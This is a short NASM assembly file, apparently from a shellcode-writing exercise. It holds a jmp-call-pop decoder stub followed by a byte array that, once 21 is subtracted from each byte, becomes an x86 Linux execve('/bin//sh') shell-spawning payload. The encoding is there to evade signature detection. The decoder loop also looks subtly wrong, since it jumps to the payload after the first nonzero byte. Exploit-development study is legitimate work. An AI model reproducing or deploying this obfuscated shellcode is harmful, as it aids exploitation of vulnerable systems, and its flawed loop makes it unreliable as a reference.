; Filename: decoder.nasm
; Author:  Yiu King Yau
;
;
;   nasm -f elf32 decoder.nasm && ld -o decoder decoder.o  
; Purpose: 

global _start			

section .text
_start:

	jmp short call_shellcode

decoder:
	pop esi
decode: 
	sub byte [esi], 21
	jnz EncodedShellcode      
	inc esi
	jmp short decode



call_shellcode:
	call decoder
	EncodedShellcode: db 0x46, 0xd5, 0x65, 0x9e, 0xf7, 0x7d, 0x44, 0x44, 0x88, 0x7d, 0x7d, 0x44, 0x77, 0x7e, 0x83, 0x9e, 0xf8, 0x65, 0xc5, 0x20, 0xe2, 0x95
